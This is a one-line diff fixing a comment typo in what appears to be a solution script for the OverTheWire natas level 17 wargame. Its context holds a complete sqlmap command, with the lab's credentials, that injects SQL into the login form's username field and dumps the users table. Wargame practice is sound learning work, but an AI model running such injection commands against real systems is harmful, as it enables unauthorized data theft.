@@ -4,7 +4,7 @@
   level17.py
   Solution for natas level17
 
-  # Sheat with sqlmap.
+  # Cheat with sqlmap.
   sqlmap --auth-type=basic --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw -u http://natas17.natas.labs.overthewire.org/index.php --data="username=a" -p username --level=5 --user-agent=Mozilla --dbms=MySQL --threads 4 -D natas17 -T users --dump
 
 """
